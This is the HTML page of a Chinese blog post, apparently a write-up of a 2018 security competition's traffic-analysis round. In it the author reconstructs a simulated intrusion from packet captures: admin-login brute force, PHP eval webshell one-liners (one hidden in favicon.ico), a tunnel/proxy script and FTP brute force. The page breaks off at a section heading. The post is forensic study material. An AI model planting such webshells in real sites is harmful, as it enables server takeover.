@@ -1,0 +1,785 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="线下赛事," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="jianghuxia's blog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="数据分析赛：这次铁三分区赛，拿了一等奖（季军），哎，有付出总有收获，玩了两个月的协议，还行。相对上个星期05.05的数据分析赛，觉得简单了很多，但其中值得学习的知识点也不少呀。">
+<meta name="keywords" content="线下赛事">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2018.05.11第七赛区铁人三项赛_赛后writeup">
+<meta property="og:url" content="https://jianghuxia.github.io/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/index.html">
+<meta property="og:site_name" content="jianghuxia&#39;s blog">
+<meta property="og:description" content="数据分析赛：这次铁三分区赛，拿了一等奖（季军），哎，有付出总有收获，玩了两个月的协议，还行。相对上个星期05.05的数据分析赛，觉得简单了很多，但其中值得学习的知识点也不少呀。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/1710413102.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/1834883302.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/1586818363.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/3895708137.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/1427483039.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/719687826.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/148249159.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/3521893764.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/2722905153.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/2325941034.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/44806724.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/1318217694.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/4029907753.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/943651555.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/2131200007.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/1379138565.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/1738362390.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/3846784427.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/384763775.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/3394366795.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/1208537828.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/435753455.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/472767690.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/70420077.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/1544902343.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/1413768279.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/754210005.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/4154369685.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/643606446.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/2901186040.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/3026454065.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/526570247.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/3964359377.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/1327320942.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/3113870093.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/4037703800.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/700114939.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/1959216493.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/3344628515.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/3452440425.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/469606264.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/3383591559.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/686413240.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/2355818266.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/1748470214.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/2128565827.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/1895590368.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/1229795221.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/3440594870.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/4195715713.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/1218808977.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/3075863408.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/13103930.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/3866312784.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/1559655328.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/411242816.png">
+<meta property="og:updated_time" content="2018-08-21T14:01:39.299Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="2018.05.11第七赛区铁人三项赛_赛后writeup">
+<meta name="twitter:description" content="数据分析赛：这次铁三分区赛，拿了一等奖（季军），哎，有付出总有收获，玩了两个月的协议，还行。相对上个星期05.05的数据分析赛，觉得简单了很多，但其中值得学习的知识点也不少呀。">
+<meta name="twitter:image" content="https://jianghuxia.github.io/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/1710413102.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://jianghuxia.github.io/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/"/>
+
+
+
+
+
+  <title>2018.05.11第七赛区铁人三项赛_赛后writeup | jianghuxia's blog</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+  
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">jianghuxia's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">Everyday very nice!</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://jianghuxia.github.io/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="jianghuxia">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/person_image.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="jianghuxia's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">2018.05.11第七赛区铁人三项赛_赛后writeup</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-05-11T21:56:32+08:00">
+                2018-05-11
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>数据分析赛：<br>这次铁三分区赛，拿了一等奖（季军），哎，有付出总有收获，玩了两个月的协议，还行。<br>相对上个星期<code>05.05</code>的数据分析赛，觉得简单了很多，但其中值得学习的知识点也不少呀。<br><a id="more"></a></p>
+<h4 id="题目简述"><a href="#题目简述" class="headerlink" title="题目简述"></a>题目简述</h4><p>比赛数据包给了<code>9</code>个，不多不少。<br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/1710413102.png" alt="clipboard(1710413102.png).png"><br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/1834883302.png" alt="clipboard(1834883302.png).png"><br>看到题目，头脑先要有个大概的黑客入侵公司的思维导图，总体脉络清晰后，我们再接着做题。<br>黑客攻击公司走的是以<code>tcp</code>为载体的<code>http</code>请求，所以过滤<code>http</code>成为解题的最基本的方法。发现漏洞，并利用了漏洞获取服务器的权限，则可以推测黑客上传了<code>webshell</code>，提权成功；可以对内网进行扫描和攻击，推出黑客提权后挂了代理，对内网及其主机进行扫描。</p>
+<h4 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h4><h5 id="关卡01-03"><a href="#关卡01-03" class="headerlink" title="关卡01~03"></a>关卡01~03</h5><p><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/1586818363.png" alt="JVMYZQZ)`{7P@LU@HM9H@V8.png"><br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/3895708137.png" alt="clipboard(3895708137.png).png"><br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/1427483039.png" alt="clipboard(1427483039.png).png"><br>打开第一个数据包，可以发现有大量的<code>404 response code</code>，可知黑客进行了目录扫描，结合题目和数据包，黑客在扫后台登陆的网站地址。<br>数据包下滑发现，<code>404</code>消失，其次是大量的<code>post</code>请求。再结合数据包分析，过滤<code>POST</code>请求，可知黑客发现登陆后台网址<code>ad_admin.php</code>，接着对用户名和密码进行了爆破。<br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/719687826.png" alt="clipboard(719687826.png).png"><br>第一个数据包翻完，还是没看到爆破终止的痕迹。<br>通过分析，我们知道了在第一个数据包中，黑客的<code>攻击ip:202.1.1.2</code>，<code>服务器ip:192.168.1.203</code>，并且黑客虽然找到了后台登陆的网址（<code>http://192.168.1.203/ad_admin.php</code>），但并未成功爆破用户名和密码。关卡<code>02</code>和关卡<code>03</code>答案呼之欲出，关卡<code>01</code>答案需要剩余的流量包查找。<br>打开第二个数据包，接着过滤<code>POST</code>请求，观察下，发现末尾第<code>1042820</code>的分组后，黑客没有再继续爆破，但这里还不能确定是否爆破成功。<br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/148249159.png" alt="clipboard.png"><br>我们怎么验证呢？我们标记下这个包，过滤http流，而又因为我们知道了黑客的<code>IP</code>，我们可以过滤此<code>IP</code>方便我们分析，并排除其他干扰数据。.<br>过滤语句：<code>http &amp;&amp; ip.addr==202.1.1.2</code><br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/3521893764.png" alt="clipboard(3521893764.png).png"><br>跳转到我们刚刚标记的包，可以发现，这个服务器对这个<code>POST</code>请求的<code>302</code>响应包的<code>Length</code>是<code>442</code>，与之前的所有<code>POST</code>请求的<code>302</code>响应包的<code>Length</code>是<code>316</code>不同。再结合标记包的下个<code>GET</code>包，根据网址的目录名中<code>homgpage</code>，我们可以大胆推测黑客爆破成功了，用户名：<code>admin</code>，密码：<code>aabbcc</code>。关卡<code>01</code>的答案即可得到。<br>当然本着学习的角度，我们还是好好分析下这个问题：<br>我们查看标记包的<code>302</code>响应包内容和之前请求的<code>302</code>响应包有啥不同：<br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/2722905153.png" alt="clipboard.png"><br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/2325941034.png" alt="clipboard (2325941034.png).png"><br>一个是<code>302</code>重定向的<code>Location</code>不同，还有一个就是标记包得到的响应包里<code>apadmin_password</code>是以<code>hash</code>值形式(为啥是<code>hash</code>的形式表示，见我的另一片文章一道赛题引起的思考——QUIC全解析)<br>根据上述，我们就可确定用户名和账号被黑客成功获得。<br>黑客获得账号和密码后，查看了后台管理的选项，进行了一些页面浏览。<br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/44806724.png" alt="clipboard.png"><br>到此，第二个数据包分析完毕。</p>
+<h5 id="关卡04-07"><a href="#关卡04-07" class="headerlink" title="关卡04~07"></a>关卡04~07</h5><p><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/1318217694.png" alt="clipboard.png"><br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/4029907753.png" alt="clipboard (as).png"><br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/943651555.png" alt="clipboard"><br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/2131200007.png" alt=""></p>
+<p>第三个数据包，打开，依照题目，写入的<code>webshell</code>需要通过<code>POST</code>提交，过滤下。<br>过滤语句：<code>http.request.method==POST &amp;&amp; ip.addr==202.1.1.2</code><br>过滤后的第一个数据包就有彩蛋<br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/1379138565.png" alt="clipboard.png"><br>解码下：<br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/1738362390.png" alt="clipboard (1738362390.png).png"><br>可知黑客把<code>&quot;&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;&quot;</code>写入了<code>shell2.php</code>里，即<code>webshell</code>的内容，关卡<code>04</code>搞定（这里正确的答案需要把<code>\</code>去掉，还好我问了小丢姐姐是不是答案有误）。<br>而做题时，关卡<code>05</code>的问题让我的思路卡顿下，因为这个问题跳跃度有点大。<br>为啥能直接扯到<code>MYSQL</code>?没思路。咋办咯。只能看剩下来的<code>POST</code>请求中<code>shell2.php</code>中的黑客的操作。<br>果然。。发现了秘密。<br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/3846784427.png" alt="clipboard (3846784427.png).png"><br>追踪下流，答案揭晓<br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/384763775.png" alt="clipboard.png"><br>接着把上面的一句话木马的指令解码下<br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/3394366795.png" alt="clipboard (3394366795.png).png"><br>原来是查看了配置的<code>config.php</code>的文件，里面有数据库的配置，这才恍然大悟，原来关卡05的考点在这。<br>做到关卡<code>06</code>的时候，纳闷了下，第一个上传的木马文件不就是<code>shell2.php</code>嘛。后面小丢姐姐说了才知道是除了<code>shell2.php</code>的第一个木马文件。<br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/1208537828.png" alt="clipboard (1208537828.png).png"><br>继续查看第三个数据包的内容，发现都是黑客查看数据库的内容的一些操作，只能继续下一个包了</p>
+<p>打开第四个包，按之前的方式过滤，没有符合要求的包。。。。额。。。又晕了。别吓我，第四个没内容。<br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/435753455.png" alt="clipboard.png"><br>东看西看，还真没内容。（做完发现第四个包是个水包）<br>只能继续下一个包查看。<br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/472767690.png" alt="clipboard (472767690.png).png"><br>打开第五个包，过滤一通。<br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/70420077.png" alt="clipboard (70420077.png).png"><br>发现<code>shell2.php</code>后面的包出现了个<code>scan.php</code>，猜测<code>scan.php</code>就是继<code>shell2.php</code>后黑客上传的第一个木马文件。<br>仔细查看响应的包，嗯，果然可以证明这个推测。<br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/1544902343.png" alt="clipboard.png"><br><code>cmd</code>内容解码下就知道，黑客上传了个新的木马文件<code>scan.php</code>，且对z1进行16进制解码即为<code>scan.php</code>的内容。<br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/1413768279.png" alt="clipboard (1413768279.png).png"><br>至此，关卡06搞定。<br>在看看下面的包，又发现了关卡<code>07</code>的答案，即黑客进行内网扫描的端口范围。<br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/754210005.png" alt="clipboard (754210005.png).png"><br>而在做题时，我看错了，以为下面这个包是端口的范围。<br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/4154369685.png" alt="clipboard (4154369685.png).png"><br>至此，第五个数据包分析完毕</p>
+<h5 id="关卡09-10"><a href="#关卡09-10" class="headerlink" title="关卡09~10"></a>关卡09~10</h5><p><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/643606446.png" alt="clipboard.png"><br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/2901186040.png" alt="clipboard (2901186040.png).png"><br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/3026454065.png" alt="clipboard (3026454065.png).png"><br>打开第六个数据包，过滤下，包不多，分析一波。黑客又登陆了后台管理，进入了备份系统，对其中的<code>bak_2018-01-29-17-47-52.zip</code>文件，进行下载。<br>关卡<code>08</code>搞定。<br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/526570247.png" alt="clipboard (526570247.png).png"></p>
+<p>接着打开第七个数据包，过滤下，查看第一个包<br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/3964359377.png" alt="clipboard.png"><br>解码下，看到<code>favicon.ico</code>（<code>ico</code>是图标文件的后缀名）<br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/1327320942.png" alt="clipboard (1327320942.png).png"><br>在把对应的<code>z1</code>的值拖到<code>winhex</code>里，在结尾部分可以发现一句话木马<code>&quot;&lt;?php @eval($_POST[&#39;picto&#39;]);?&gt;&quot;</code><br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/3113870093.png" alt="clipboard (3113870093.png).png"><br>picto即为隐藏在<code>favicon.ico</code>图片中的一句话木马。关卡<code>09</code>搞定。<br>继续分析流量包，发现<code>95286</code>分组的数据表示黑客查看了文件目录下的文件，而<code>106442</code>分组中的数据修改了<code>obj_edit.php</code>的内容。<br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/4037703800.png" alt="clipboard.png"><br>而在整个过滤后的数据包末端，出现了一个新的<code>tunnel.php</code><br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/700114939.png" alt="clipboard (700114939.png).png"><br>经过分析，是新建的一个木马文件<code>tunnel.php</code>，作用是设置代理，监听端口。<br>所以，黑客是通过修改<code>obj_edit.php</code>文件，配合<code>tunnel.php</code>进行下一步行动。关卡<code>10</code>搞定。<br>第七个数据包分析完毕。</p>
+<h5 id="关卡11-04"><a href="#关卡11-04" class="headerlink" title="关卡11~04"></a>关卡11~04</h5><p><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/1959216493.png" alt="clipboard.png"><br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/3344628515.png" alt="clipboard (3344628515.png).png"><br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/3452440425.png" alt="clipboard (3452440425.png).png"><br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/469606264.png" alt="clipboard (469606264.png).png"><br>打个岔，这次比赛我觉得从关卡<code>11</code>到关卡<code>14</code>都不好做，对于我个人而言，我是在<code>13</code>点之前做完全部的数据分析题的，九点开始的比赛，前十个问题我花了两个多小时完成，剩下的全部花在后四题。。。<br>打开第八个数据包，结合关卡<code>11</code>的问题，一脸懵逼。。后面发现端口<code>1433</code>即是<code>ftp</code>开放的端口（别问为什么，这题我真是懵的，我刚开始蒙<code>22</code>,错了，后面看到这个<code>1433</code>，试一下，竟然对了）<br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/3383591559.png" alt="clipboard.png"><br>关卡<code>11</code>搞定（懵的，请老哥们指教）。<br>剩下的第八个数据包的分组，可以分析得知，黑客在爆破<code>ftp</code>的账号和密码，但是没成功。</p>
+<p>接着打开第九个数据包，过滤分析<br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/686413240.png" alt=")cjc$of8q224.png"><br>这个<code>ftp</code>登录密码我是怎么找到并最终确认的呢？因为观察了下，下面那个标记的数据包是第一个<code>ftp</code>的命令操作，而离这个<code>ftp</code>命令最近的密码是<code>62236</code>显示的内容 ，我才提交并确认这个密码的。关卡<code>12</code>搞定。<br>剩下的关卡<code>11</code>和关卡<code>14</code>我是怎么做出来的呢？我下面写的，你可能觉得这是运气，但，不得不承认，这是<code>wireshark</code>的一个功能，而我恰好知道。<br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/2355818266.png" alt="clipboard.png"><br>当我做完关卡<code>11</code>后，剩下<code>http</code>数据包特别多，长时间分析无果，我换了个思路，把数据包的分组按<code>Length</code>排序，而不是按分组号排序。<br>查看第一个包，就会发现有个<code>readmd.rtf</code>(比赛的时候提交错误，后面问了小丢姐姐，姐姐说把第二个d改成e)<br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/1748470214.png" alt="clipboard.png"><br>为啥我最后可以确定答案是<code>readmd.rtf</code>去向小丢姐姐问是不是原本的答案有错呢？<br>因为，在接下来的分析中，我找到了另外一个显示目录的分组，下面是它们的对比。<br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/2128565827.png" alt="clipboard (2128565827.png).png"><br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/1895590368.png" alt="clipboard (1895590368.png).png"><br>可以发现，时间的误差和新文件的写入正好符合时间差。所以，关卡12搞定。</p>
+<p>最后就剩下了个关卡14了。。。这个。真的。。。。又是懵的。<br>最后一题在剩余最后四题又是做的最久的。<br>这里考察了一个知识点：<br><code>227 Entering Passive Mode (127,0,0,1,26,80).</code>代表客户机使用PASV模式连接服务器的<code>26x256+108=6764</code>端口。<br>然后过滤<code>IP</code>，找到端口。（等会讲讲）<br>但是那时候我不会啊。。不知道啊。。。咋办，继续找呗。。。后面发现了这个<br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/1229795221.png" alt="clipboard.png"><br>这个<code>CVE-2017-8570</code>即是最后的答案。。。</p>
+<p>在分析过程中，我也看到了这个，还郁闷怎么会有这玩意来着。。后面，卡最后一题实在太久了，小丢姐姐也问我们还有没有没吃饭的，我就乖乖地去吃饭饭了。吃饭过程，想了想，不对啊，那个<code>CVE</code>是干啥的，会不会就是最后一题答案，越想越觉得有这可能，扒了几口饭就回去提交，提交前口里喊了一声“圣光请赐予我力量”。弹出提示，“恭喜你，完成本比赛所有关卡，并给予30%的总分额外奖励”，队友这个时候疯狂摸我大腿，口里念叨着“大佬大佬大佬啊”。<br>真变态，人家可是腼腆羞涩的纯情单身大男孩呢。</p>
+<h4 id="迷之坑点"><a href="#迷之坑点" class="headerlink" title="迷之坑点"></a>迷之坑点</h4><p>虽然，数据赛拿了满分，但是，其中还是有些问题和坑点，下面介绍</p>
